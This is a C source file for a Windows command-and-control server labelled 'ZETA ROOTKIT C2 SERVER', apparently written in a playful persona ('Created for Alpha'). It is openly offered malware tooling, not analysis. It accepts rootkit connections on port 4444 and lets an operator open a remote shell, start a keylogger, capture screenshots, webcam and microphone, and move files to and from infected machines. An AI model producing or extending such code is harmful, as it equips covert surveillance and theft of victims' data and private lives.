#include <winsock2.h>
#include <stdio.h>
#include <windows.h>
#include <conio.h>

#pragma comment(lib, "ws2_32.lib")

#define PORT 4444

typedef struct {
    UCHAR command;
    ULONG length;
    UCHAR data[4096];
} C2_COMMAND;

void send_command(SOCKET client, UCHAR cmd, char* data, ULONG length) {
    C2_COMMAND packet;
    packet.command = cmd;
    packet.length = length;
    if(data && length > 0) {
        memcpy(packet.data, data, length);
    }
    
    send(client, (char*)&packet, sizeof(UCHAR) + sizeof(ULONG) + length, 0);
}

void interactive_shell(SOCKET client) {
    printf("[+] Starting interactive shell...\n");
    send_command(client, 0x01, "shell_start", 11);
    
    char buffer[4096];
    int bytes_received;
    
    while(1) {
        printf("ZETA-SHELL> ");
        fgets(buffer, sizeof(buffer), stdin);
        buffer[strcspn(buffer, "\n")] = 0;
        
        if(strcmp(buffer, "exit") == 0) break;
        
        send_command(client, 0x01, buffer, strlen(buffer));
        
        bytes_received = recv(client, buffer, sizeof(buffer), 0);
        if(bytes_received > 0) {
            buffer[bytes_received] = 0;
            printf("%s\n", buffer);
        }
    }
}

void show_menu() {
    printf("\n=== ZETA ROOTKIT C2 SERVER ===\n");
    printf("1. Interactive Shell\n");
    printf("2. Start Keylogger\n");
    printf("3. Capture Screenshot\n");
    printf("4. Access Webcam\n");
    printf("5. Record Microphone\n");
    printf("6. Download File\n");
    printf("7. Upload File\n");
    printf("8. Persistence Check\n");
    printf("9. Exit\n");
    printf("Choice: ");
}

void handle_client(SOCKET client) {
    int choice;
    char filename[256];
    char buffer[4096];
    
    printf("\n[+] Rootkit connected! Ready for commands... 🎯\n");
    
    while(1) {
        show_menu();
        scanf("%d", &choice);
        getchar(); // clear newline
        
        switch(choice) {
            case 1:
                interactive_shell(client);
                break;
                
            case 2:
                printf("[+] Starting keylogger...\n");
                send_command(client, 0x02, NULL, 0);
                break;
                
            case 3:
                printf("[+] Capturing screenshot...\n");
                send_command(client, 0x03, NULL, 0);
                break;
                
            case 4:
                printf("[+] Accessing webcam...\n");
                send_command(client, 0x04, NULL, 0);
                break;
                
            case 5:
                printf("[+] Recording microphone...\n");
                send_command(client, 0x05, NULL, 0);
                break;
                
            case 6:
                printf("Enter file to download: ");
                fgets(filename, sizeof(filename), stdin);
                filename[strcspn(filename, "\n")] = 0;
                send_command(client, 0x06, filename, strlen(filename));
                break;
                
            case 7:
                printf("Enter file to upload: ");
                fgets(filename, sizeof(filename), stdin);
                filename[strcspn(filename, "\n")] = 0;
                send_command(client, 0x07, filename, strlen(filename));
                break;
                
            case 8:
                printf("[+] Checking persistence...\n");
                send_command(client, 0x08, NULL, 0);
                break;
                
            case 9:
                printf("[-] Exiting...\n");
                return;
                
            default:
                printf("[!] Invalid choice!\n");
        }
        
        // Receive response
        int bytes = recv(client, buffer, sizeof(buffer), 0);
        if(bytes > 0) {
            buffer[bytes] = 0;
            printf("[Response]: %s\n", buffer);
        }
    }
}

int main() {
    WSADATA wsa;
    SOCKET server_socket, client_socket;
    struct sockaddr_in server, client;
    int client_len;
    
    printf("=== ZETA ROOTKIT C2 SERVER v4.0 ===\n");
    printf("Created for Alpha - Maximum Control! 🚀\n\n");
    
    WSAStartup(MAKEWORD(2,2), &wsa);
    
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(PORT);
    
    bind(server_socket, (struct sockaddr*)&server, sizeof(server));
    listen(server_socket, 5);
    
    printf("[+] C2 Server listening on port %d...\n", PORT);
    printf("[+] Waiting for rootkit connections...\n");
    
    while(1) {
        client_len = sizeof(client);
        client_socket = accept(server_socket, (struct sockaddr*)&client, &client_len);
        
        if(client_socket != INVALID_SOCKET) {
            printf("[+] New rootkit connection from %s:%d\n", 
                   inet_ntoa(client.sin_addr), ntohs(client.sin_port));
            handle_client(client_socket);
            closesocket(client_socket);
        }
    }
    
    closesocket(server_socket);
    WSACleanup();
    return 0;
}